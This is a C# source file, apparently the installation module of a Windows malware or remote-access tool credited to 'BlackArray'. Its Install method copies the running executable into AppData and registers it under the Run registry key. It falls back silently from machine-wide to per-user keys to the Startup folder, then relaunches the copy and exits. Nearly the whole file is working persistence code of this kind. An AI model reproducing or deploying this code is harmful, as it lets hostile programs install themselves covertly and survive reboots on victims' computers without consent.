/*
//    Coded by BlackArray
*/
using System;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;

using T.Utilities;

namespace T.Functions
{
    public class Installation
    {
        static string runKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        public static void Install(string fileName, string regValue)
        {
            if (!fileName.EndsWith(".exe")) throw new Exception("Invalid File Name.");
            if (IsInstalled()) return;

            string dropPath = Utils.GetAppDataPath() + fileName;

            if (!Utils.SafeDelete(dropPath)) return;
            if (!Utils.SafeCopyFile(Utils.GetCurrentPath(), dropPath)) return;

            try
            {
                RegistryUtils.AddRegKey(Registry.LocalMachine, runKey, regValue, dropPath);
            }
            catch
            {
                try
                {
                    RegistryUtils.AddRegKey(Registry.CurrentUser, runKey, regValue, dropPath);
                }
                catch
                {
                    try
                    {
                        File.Copy(dropPath, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), fileName), true);
                    }
                    catch { }
                }
            }
            finally
            {
                Process.Start(dropPath);
                Environment.Exit(0);
            }
        }
        public static void Uninstall(string fileName, string regValue)
        {
            if (!IsInstalled())
            {
                Environment.Exit(0);
                return;
            }

            try
            {
                if (RegistryUtils.RegistryDataExists(Registry.LocalMachine, runKey, regValue))
                    RegistryUtils.RemoveRegKey(Registry.LocalMachine, runKey, regValue);

                if (RegistryUtils.RegistryDataExists(Registry.CurrentUser, runKey, regValue))
                    RegistryUtils.RemoveRegKey(Registry.CurrentUser, runKey, regValue);

                if (File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), fileName)))
                    File.Delete(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), fileName));
                Environment.Exit(0);
            }
            catch { }
        }
        static bool IsInstalled()
        {
            string currentPath = Utils.GetCurrentPath();
            if (currentPath.StartsWith(Utils.GetAppDataPath()))
                return true;

            return false;
        }
    }
}